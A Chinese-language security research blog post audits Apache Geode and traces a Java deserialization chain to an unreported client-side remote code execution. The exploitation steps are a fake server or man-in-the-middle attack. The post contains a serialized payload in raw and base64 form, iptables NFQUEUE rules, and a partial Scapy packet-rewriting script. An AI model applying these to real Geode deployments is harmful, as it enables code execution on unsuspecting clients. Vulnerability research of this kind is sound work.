---
title: Apache Geode审计现场实战 - 漏洞链构造/实时更新
published: true
---

这段时间笔者准备重新审计在此之前遇到的一个 Apache 中间件 Apache Geode，并且会在这里实时开源自己新鲜审计出来的漏洞链和已经审计出来的 RCE 漏洞，供读者学习  

如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系(反正咱也不缺这一个)，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi)  

在审计过程中也能学习到最优秀的程序员 coding 风格

| 目录/漏洞链跳转 |
|--------|
| [漏洞链 1: CacheServerHelper.deserialize(Args)](#漏洞链-1) |
| [漏洞链 2: 基于漏洞链1直接到达用户 interface](#漏洞链-2) |
| [AGVL-01漏洞: Apache Geode 客户端反序列化RCE漏洞(基于漏洞链2)](#漏洞agvl-01) |
| [漏洞链 3: 暂未更新](#漏洞链-3) |
| [对Apache Geode开发者的一些建议](#对该中间件开发者的一些建议) |

<table style="border:1px solid #2bbc8a;border-collapse: collapse" border="1">
  <tr><td colspan="2">
    由 leeya_bug 当前找出的 Apache Geode 漏洞
  </td></tr>
  <tr><td>
    AGVL-01: Apache Geode 客户端反序列化RCE漏洞
  </td><td>
    由于客户端不正确地接收了来自服务端的数据流并将其误静态判断后反序列化，若攻击者伪造服务端/中间人攻击，将触发该反序列化漏洞
  </td></tr>
</table>

注意，本篇文章不遵循 CC4 协议，其内容均为 leeya_bug 所有，禁止转载


# [](#header-31)Apache Geode介绍

Apache Geode 是一个基于 JVM 的 NoSQL 分布式数据处理平台，提供实时的、一致的、贯穿整个云架构地访问数据关键型应用，他的特点是强一致性和高实时性、对数据结构有更强的表达能力，能描述部分逻辑表达的内存数据库  

Apache Geode 的官方网站：[https://geode.apache.org/](https://geode.apache.org/)  
Apache Geode 的官方仓库：[https://github.com/apache/geode](https://github.com/apache/geode)  


# [](#header-31)漏洞链 1:
# [](#header-31)CacheServerHelper.deserialize(Args)

笔者将会省略一些无关紧要的内容，尽量简述. 更多细节请读者私下自行测试

笔者注意到 org.apache.geode.internal.cache.tier.sockets.CacheServerHelper 被该中间件广泛使用在 client 和 server 的 Cache 交互中的处理文件或对象反序列化场景，而该对象关键三个方法如下所示  

```java
public class CacheServerHelper {
    public static Object deserialize(byte[] blob) throws IOException, ClassNotFoundException {
        return deserialize(blob, false);
    }

    public static Object deserialize(byte[] blob, boolean unzipObject) throws IOException, ClassNotFoundException {
        return unzipObject ? unzip(blob) : BlobHelper.deserializeBlob(blob);
    }

    public static Object deserialize(byte[] blob, KnownVersion version, boolean unzipObject) throws IOException, ClassNotFoundException {
        return unzipObject ? unzip(blob) : BlobHelper.deserializeBlob(blob, version, (ByteArrayDataInput)null);
    }
}

```

这几个重载都将数据引到 unzip 或 BlobHelper.deserializeBlob 中，虽然 unzip 在解压后直接能够触发反序列化，但该方法在源代码中不会被调用. 因此这里笔者直接跟进 BlobHelper.deserializeBlob 即 org.apache.geode.internal.util.BlobHelper.basicReadObject  

中间调用路径只是在将数据类型转化来转化去，笔者认为有省略的必要  

中间调用路径省略，而后经过逐层调用后直接来到了 org.apache.geode.internal.InternalDataSerializer.basicReadObject，此时由用户输入而来的参数 in 的类型为 PdxInputStream 既继承了 InputStream 又实现了 DataInput

```java
public class PdxInputStream extends ImmutableByteBufferInputStream
```

继续跟进 basicReadObject，其方法流程分析:  
1. 该方法首先先调用 DscodeHelper.toDSCODE 获取 header 判断文件类型后，根据类型进行解析操作. 在此直接取出 DSCODE 枚举类然后观察变量映射即可，笔者不赘述. 观察得知 44 为 SERIALIZABLE  

2. 继续如下 switch case 流程，笔者发现当 header 等于 SERIALIZABLE 时，能直接进入 readSerializable 然后调用 readObject  

basicReadObject 关键代码解析如下所示

```java
public abstract class InternalDataSerializer extends DataSerializer {

    public static Object basicReadObject(DataInput in) throws IOException, ClassNotFoundException {
        checkIn(in);
        byte header = in.readByte(); //获取 header
        DSCODE headerDSCode = DscodeHelper.toDSCODE(header); //获取 header 映射值 
        ...[日志省略]...

        if (headerDSCode == null) {
            ...[错误处理，忽略]...
        } else {
            switch (headerDSCode) {

                ...[省略几十个cases]...

                case SERIALIZABLE:
                    return readSerializable(in); //继续跟进，调用 InputStream.readObject

                ...[省略几十个cases]...

                default:
                    ...[错误处理，忽略]...
            }
        }
    }
}
```

继续跟进 readSerializable，逻辑是如果 in 继承 InputStream 了就直接强转为 InputStream，没有继承 InputStream 就写个 InputStream 的继承然后写个闭包的override read 方法(这个地方很重要，因为后续流很可能只实现了 DataInput)，如下所示  

```java
public abstract class InternalDataSerializer extends DataSerializer {

    private static Serializable readSerializable(final DataInput in) throws IOException, ClassNotFoundException {
        ...[日志省略]...
        Serializable serializableResult;
        //这里是 PdxInputStream 因此不进入
        if (in instanceof DSObjectInputStream) {
            ...[不会进入该判断]...
        } else {
            InputStream stream;
            if (in instanceof InputStream) {
                stream = (InputStream)in;
            } else {
                //继承并 override read
                stream = new InputStream() {
                    public int read() throws IOException {
                        try {
                            return in.readUnsignedByte();
                        } catch (EOFException var2) {
                            return -1;
                        }
                    }
                };
            }
            //强转为 DSObjectInputStream
            ObjectInput ois = new DSObjectInputStream(stream);
            serializationFilter.setFilterOn((ObjectInputStream)ois);
            //这里虽然 DSObjectInputStream 是其子类，但无其他判断故省略  
            if (stream instanceof VersionedDataStream) {
                ...[日志省略]...
            }
            //成功 readObject 反序列化
            serializableResult = (Serializable)((ObjectInput)ois).readObject();
            ...[下面的代码省略]..
        }
        ...[下面的代码省略]..
    }
}

```
接下来构造 Payload  
Payload 就很简单了，构造流程只需要将 ObjectInputStream.writeObject 后的反序列化链字节流前置一个 44 字节即可，Payload 为 `b',\xac\xed\x00\x05sr\x00\x11org.example.HACK2\xcb\xa8s\x8d\xc3mwj\x02\x00\x00xp'`，构造流程不在此演示  
这里读者的 Payload 为自行在本地写的一个名为 HACK2 的类，懒得写个反序列化链了，若有想打入反序列化链的读者请自行尝试  

```java
//Payload
package org.example;

import java.io.IOException;
import java.util.Base64;
import org.apache.geode.internal.cache.tier.sockets.CacheServerHelper;

public class Payload1 {
    public Payload1() throws IOException, ClassNotFoundException {
        byte[] payload = Base64.getDecoder().decode("LKztAAVzcgARb3JnLmV4YW1wbGUuSEFDSzLLqHONw213agIAAHhw");
        CacheServerHelper.deserialize(payload);
    }
}
```

# [](#header-31)漏洞链 2:
# [](#header-31)基于漏洞链1直接到达用户 interface

在漏洞链2的构造过程中需要连接服务器并动态调试，因此笔者使用了IP为 172.245.82.84 的笔者合法购买的服务器，谁想打谁打吧反正就一个22端口

在 172.245.82.84 装上 jdk1.8 运行 gfsh 命令终端后，输入以下几行命令启动 Geode 服务端并且初始化 locator、server、region

```bash
start locator --bind-address=172.245.82.84
start server --bind-address=172.245.82.84
create region --name=hello --type=REPLICATE_PERSISTENT
```

接下来在客户端中构造连接服务端的 java 代码，如下代码所示

```java
import org.apache.geode.cache.Region;
import org.apache.geode.cache.client.ClientCache;
import org.apache.geode.cache.client.ClientCacheFactory;
import org.apache.geode.cache.client.ClientRegionShortcut;

public class Main {

    public static void main(String[] args) throws Exception {
        try {
            ClientCache cache = new ClientCacheFactory().addPoolLocator("172.245.82.84", 10334).create();
            Region<String, String> region = cache.<String, String>createClientRegionFactory(ClientRegionShortcut.PROXY).create("hello");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

在与服务端建立连接前，启动 Wireshark 来监测流量. 由于该流量为基于 TCP 的自建协议(以下简称 "Geode 协议")，笔者直接过滤掉其他非 Geode 协议数据然后输入过滤语句`ip.dst == 172.245.82.84 || ip.src == 172.245.82.84`(172.245.82.84 是笔者本人服务端IP)开始监测应用流量

而后运行代码，观测先前笔者在漏洞链1中提到的 InternalDataSerializer.basicReadObject 中的栈变量，在第一次客户端与服务端通信并调用 InternalDataSerializer.basicReadObject 时，我们会发现如下所示 in 中的 bytearr 值全为0. 不过先别急，这应该是 buffer 预留信息

![avatar](/image/2024-06-01-1.png)  

在重复地 Resume 了几次后，笔者终于发现这里有了非 0 的输入流，如下所示  

![avatar](/image/2024-06-01-2.png)  

继续跟进该输入流，发现还是到了利用链1中 switch (headerDSCode) 那一步，如果构造该流的头部一字节值为 44 并植入恶意 Payload，那就会顺理成章地反序列化 RCE

接下来总结该数据的规律:  
经过笔者多次反复重启 + Resume 观测后发现该流的 header 固定为 015C04AC ，且长度普遍在 80 - 100 的区间范围内.   
接下来打开 WireShark 分析，多次运行并抓包看看是否能找到对应流量  

找到最近监测的几条来自 172.245.82.84 的流量，终于发现某条 Geode 协议流量的 Data 段跟我们刚刚观测到的流量特征一模一样，如下红线处所示  

![avatar](/image/2024-06-01-3.png)  

那这不就巧了吗，直接中间人攻击或者服务端伪造更改其内容为漏洞链1的 Payload 不就行了？

# [](#header-31)漏洞agvl-01:
# [](#header-31)Apache Geode 客户端反序列化RCE漏洞(基于漏洞链2)

接下来笔者需要做的事情就是构造一个伪服务端，拦截发送到客户端的 TCP 流量后观察其 Data 头部是否为 015C04AC，若是，则将 Data 替换为漏洞链1的 Payload  
`b',\xac\xed\x00\x05sr\x00\x11org.example.HACK2\xcb\xa8s\x8d\xc3mwj\x02\x00\x00xp'`

上面这段话看似简单，实际上要实现并非简单. 基于 TCP 协议的 Geode 协议并非类似于应用层 HTTP(s) 这种协议，想拦就拦想改就改. 按照以往流程，笔者需要在 Linux 服务器上写个 hook 函数直接拦截 TCP 流量并观察其内容  

不过笔者又不想写 hook，只能找到了一个 Scapy + netfilterqueue 已经替用户封装好了的替代方案，通过 iptables 重定向流量导入 netfilterqueue 后再编写 Python 代码从 netfilterqueue 中抓取 TCP 流量

首先在 Server 端安装 netfilterqueue 在 CentOS7 操作系统上的依赖，命令如下所示

```bash
yum install python3-devel
yum install libnetfilter_queue
yum install libnfnetlink-devel
yum install libnetfilter_queue-devel
```

更改 iptables，如下所示

```bash
#更改 iptables 配置
#注意在更改前一定要有 VNC 环境或者本地服务器！否则远程连接直接断开！
iptables -A INPUT -j NFQUEUE --queue-num 0
iptables -A OUTPUT -j NFQUEUE --queue-num 0
```

在使用 pip 安装完毕 netfilterqueue python 接口 package 后，运行以下代码

```py
#写 TCP 抓包改包 hook 并运行
from scapy.all import *
import netfilterqueue

def p(data):
  pkt = IP(data.get_payload())
  #抓 172.245.82.84 发出去的包
  if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[IP].src=='172.245.82.84':
      #...[请读者自行配置和思考该部分内容]...

  data.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, p)
queue.run()
```

在配置完毕后，运行客户端连接 172.245.82.84 时直接弹计算器出来，证明此处存在命令执行漏洞  

![avatar](/image/2024-06-01-4.png)  

这部分笔者还未提交至任何漏洞平台，仅在此公开，原因如下：

1. Apache Geode 部署流程、伪服务器构造过程都比较棘手，搞坏了我两台服务器真机(不包括 docker)的配置环境
2. 鉴于复现过程中受到远程/本地缓存的影响，客户端多次向服务端获取缓存后，很可能就不获取了，也就无法触发该漏洞
3. 笔者学业繁忙，如果想要达到 100% 复现率，需要花半把个月时间将整个 Geode 协议吃透，而本篇文章仅为学习用途，因此无任何深入研究  Geode 协议并将其利益化的必要

总之如果有想部署复现、学习的读者可以联系笔者参考，想拿来交 CVE 的读者就随便交吧

至于为什么该漏洞编号为 AGVL-01 呢？是因为 AGVL 是 Apache Geode Vulnerability by leeya_bug 的简称

# [](#header-31)漏洞链 3:

今天星期六休息

# [](#header-31)对该中间件开发者的一些建议

在Apache Geode中，有那么一些小特性：

1. Apache Geode 创建的 server、locator 绑定的IP必须与用户在同一子网下，使用穿透、端口映射等方法均完全无法正常访问，同理对于 docker 镜像部署几乎属于 0 支持(这听起来十分离谱，不像是一个现代框架该有的特性，但是经过笔者个人在Stack Overflow上搜集求证后发现其是真实的)
2. 官方文档缺斤少两：无论是中文的文档还是英文的文档，都是缺斤少两. 很多函数调用细节都是笔者猜想出来的
3. 对于个人用户的支持性极差：几乎只适合企业级场景
4. 错误处理极为奇葩：笔者在动态调试过程中只收到过一类正确的 Exception，当然是笔者自己忘记 docker 映射端口的原因，后续收到的 Exceptions 几乎都是无脑 throw 底部栈

笔者个人的建议是：  

1. 希望 Apache Geode 在网络数据交互方面能有更多的优化和测试
2. 如<!--果一个开发者只是对于软件架构理解地好，对于网络编程几乎0掌握，那我建议他千万千万别来搞 Web 开发，千万别来写中间件，自己开发的东西为什么没人用自己没有点b数吗？-->